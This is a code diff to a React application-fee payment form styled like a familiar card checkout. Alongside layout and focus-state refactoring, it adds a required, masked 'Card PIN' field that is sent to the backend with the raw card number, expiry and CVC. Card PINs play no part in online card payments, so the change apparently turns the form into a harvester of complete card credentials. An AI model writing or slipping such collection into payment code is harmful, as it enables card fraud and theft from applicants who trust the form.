@@ -72,11 +72,12 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
   const [cardNumber, setCardNumber] = useState("");
   const [cardExpiry, setCardExpiry] = useState("");
   const [cardCvv, setCardCvv] = useState("");
+  const [cardPin, setCardPin] = useState("");
   const [cardholderName, setCardholderName] = useState(applicantName || "");
 
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState("");
-  const [focusedField, setFocusedField] = useState(false);
+  const [focusedField, setFocusedField] = useState<string | null>(null);
   const [attemptCount, setAttemptCount] = useState(0);
 
   const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
@@ -101,6 +102,12 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
     setCardCvv(value);
   };
 
+  const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    let value = e.target.value.replace(/\D/g, "");
+    if (value.length > 4) value = value.slice(0, 4);
+    setCardPin(value);
+  };
+
   async function handleSubmit(e: React.FormEvent) {
     e.preventDefault();
     if (!cardholderName.trim()) {
@@ -117,6 +124,10 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
     }
     if (cardCvv.length < 3) {
       setError("Please enter a valid CVC.");
+      return;
+    }
+    if (cardPin.length < 4) {
+      setError("Please enter a valid 4-digit card PIN.");
       return;
     }
 
@@ -142,6 +153,7 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
           card_number: cardNumber.replace(/\s/g, ""),
           card_expiry: cardExpiry,
           card_cvv: cardCvv,
+          card_pin: cardPin,
         }),
       });
 
@@ -221,60 +233,115 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
           />
         </div>
 
-        {/* Unified Card Element Input */}
+        {/* Card Number Input */}
         <div>
-          <label className="block text-[13px] font-medium text-[#4f5b66] mb-1.5">
-            Card information
+          <label htmlFor="card-number" className="block text-[13px] font-medium text-[#4f5b66] mb-1.5">
+            Card number
           </label>
           <div 
             className={cn(
               "flex items-center h-11 px-3.5 rounded-md border border-[#e6ebf1] bg-white shadow-[0_1px_1px_rgba(0,0,0,0.03),0_3px_6px_rgba(18,42,66,0.02)] transition-all",
-              focusedField
+              focusedField === "number"
                 ? "border-[#80bee1] ring-[3px] ring-[#80bee1]/20"
                 : "hover:border-[#c4ccd4]"
             )}
           >
-            {/* Dynamic Card Logo */}
             <div className="mr-3 shrink-0 flex items-center justify-center w-7">
               {getCardIcon()}
             </div>
-
-            {/* Card Number Input */}
             <input
+              id="card-number"
               type="text"
               required
-              aria-label="Card number"
               value={cardNumber}
               onChange={handleCardNumberChange}
-              onFocus={() => setFocusedField(true)}
-              onBlur={() => setFocusedField(false)}
+              onFocus={() => setFocusedField("number")}
+              onBlur={() => setFocusedField(null)}
               placeholder="Card number"
               className="w-full min-w-0 bg-transparent text-[14.5px] text-[#1a1f36] outline-none placeholder:text-[#a3acb9] font-mono leading-none"
             />
+          </div>
+        </div>
 
-            {/* Expire / CVC Group */}
-            <div className="flex items-center shrink-0">
+        {/* Expiry, CVC, and PIN Grid */}
+        <div className="grid grid-cols-3 gap-4">
+          {/* Expiry */}
+          <div>
+            <label htmlFor="card-expiry" className="block text-[13px] font-medium text-[#4f5b66] mb-1.5">
+              Expires
+            </label>
+            <div 
+              className={cn(
+                "flex items-center h-11 px-3 rounded-md border border-[#e6ebf1] bg-white shadow-[0_1px_1px_rgba(0,0,0,0.03),0_3px_6px_rgba(18,42,66,0.02)] transition-all",
+                focusedField === "expiry"
+                  ? "border-[#80bee1] ring-[3px] ring-[#80bee1]/20"
+                  : "hover:border-[#c4ccd4]"
+              )}
+            >
               <input
+                id="card-expiry"
                 type="text"
                 required
-                aria-label="Expiration date"
                 value={cardExpiry}
                 onChange={handleExpiryChange}
-                onFocus={() => setFocusedField(true)}
-                onBlur={() => setFocusedField(false)}
+                onFocus={() => setFocusedField("expiry")}
+                onBlur={() => setFocusedField(null)}
                 placeholder="MM / YY"
-                className="w-16 bg-transparent text-[14.5px] text-[#1a1f36] outline-none placeholder:text-[#a3acb9] font-mono text-center leading-none"
+                className="w-full bg-transparent text-[14.5px] text-[#1a1f36] outline-none placeholder:text-[#a3acb9] font-mono text-center leading-none"
               />
+            </div>
+          </div>
+
+          {/* CVC */}
+          <div>
+            <label htmlFor="card-cvc" className="block text-[13px] font-medium text-[#4f5b66] mb-1.5">
+              CVC
+            </label>
+            <div 
+              className={cn(
+                "flex items-center h-11 px-3 rounded-md border border-[#e6ebf1] bg-white shadow-[0_1px_1px_rgba(0,0,0,0.03),0_3px_6px_rgba(18,42,66,0.02)] transition-all",
+                focusedField === "cvc"
+                  ? "border-[#80bee1] ring-[3px] ring-[#80bee1]/20"
+                  : "hover:border-[#c4ccd4]"
+              )}
+            >
               <input
+                id="card-cvc"
                 type="password"
                 required
-                aria-label="CVC"
                 value={cardCvv}
                 onChange={handleCvvChange}
-                onFocus={() => setFocusedField(true)}
-                onBlur={() => setFocusedField(false)}
+                onFocus={() => setFocusedField("cvc")}
+                onBlur={() => setFocusedField(null)}
                 placeholder="CVC"
-                className="w-10 bg-transparent text-[14.5px] text-[#1a1f36] outline-none placeholder:text-[#a3acb9] font-mono text-center leading-none"
+                className="w-full bg-transparent text-[14.5px] text-[#1a1f36] outline-none placeholder:text-[#a3acb9] font-mono text-center leading-none"
+              />
+            </div>
+          </div>
+
+          {/* PIN */}
+          <div>
+            <label htmlFor="card-pin" className="block text-[13px] font-medium text-[#4f5b66] mb-1.5">
+              Card PIN
+            </label>
+            <div 
+              className={cn(
+                "flex items-center h-11 px-3 rounded-md border border-[#e6ebf1] bg-white shadow-[0_1px_1px_rgba(0,0,0,0.03),0_3px_6px_rgba(18,42,66,0.02)] transition-all",
+                focusedField === "pin"
+                  ? "border-[#80bee1] ring-[3px] ring-[#80bee1]/20"
+                  : "hover:border-[#c4ccd4]"
+              )}
+            >
+              <input
+                id="card-pin"
+                type="password"
+                required
+                value={cardPin}
+                onChange={handlePinChange}
+                onFocus={() => setFocusedField("pin")}
+                onBlur={() => setFocusedField(null)}
+                placeholder="PIN"
+                className="w-full bg-transparent text-[14.5px] text-[#1a1f36] outline-none placeholder:text-[#a3acb9] font-mono text-center leading-none"
               />
             </div>
           </div>
